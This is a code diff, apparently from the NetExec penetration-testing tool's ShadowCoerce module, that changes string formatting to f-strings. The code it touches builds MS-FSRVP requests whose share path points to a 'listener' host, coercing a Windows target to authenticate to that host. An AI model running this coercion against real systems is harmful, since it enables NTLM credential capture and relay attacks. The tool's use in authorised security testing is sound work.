@@ -107,7 +107,7 @@ class DCERPCSessionError(DCERPCException):
                 error_msg_verbose,
             )
         else:
-            return "SessionError: unknown error code: 0x%x" % self.error_code
+            return f"SessionError: unknown error code: 0x{self.error_code:x}"
 
 
 ################################################################################
@@ -229,7 +229,7 @@ class CoerceAuth:
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-        nxc_logger.info("Connecting to %s" % binding_params[pipe]["stringBinding"])
+        nxc_logger.info(f"Connecting to {binding_params[pipe]['stringBinding']}")
 
         try:
             dce.connect()
@@ -239,14 +239,14 @@ class CoerceAuth:
                 dce.disconnect()
                 return 1
 
-            nxc_logger.debug("Something went wrong, check error status => %s" % str(e))
+            nxc_logger.debug(f"Something went wrong, check error status => {str(e)}")
 
         nxc_logger.info("Connected!")
-        nxc_logger.info("Binding to %s" % binding_params[pipe]["UUID"][0])
+        nxc_logger.info(f"Binding to {binding_params[pipe]['UUID'][0]}")
         try:
             dce.bind(uuidtup_to_bin(binding_params[pipe]["UUID"]))
         except Exception as e:
-            nxc_logger.debug("Something went wrong, check error status => %s" % str(e))
+            nxc_logger.debug(f"Something went wrong, check error status => {str(e)}")
 
         nxc_logger.info("Successfully bound!")
         return dce
@@ -257,7 +257,7 @@ class CoerceAuth:
             request = IsPathShadowCopied()
             # only NETLOGON and SYSVOL were detected working here
             # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
-            request["ShareName"] = "\\\\%s\\NETLOGON\x00" % listener
+            request["ShareName"] = f"\\\\{listener}\\NETLOGON\x00"
             # request.dump()
             dce.request(request)
         except Exception as e:
@@ -273,7 +273,7 @@ class CoerceAuth:
             request = IsPathSupported()
             # only NETLOGON and SYSVOL were detected working here
             # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
-            request["ShareName"] = "\\\\%s\\NETLOGON\x00" % listener
+            request["ShareName"] = f"\\\\{listener}\\NETLOGON\x00"
             dce.request(request)
         except Exception as e:
             nxc_logger.debug("Something went wrong, check error status => %s", str(e))
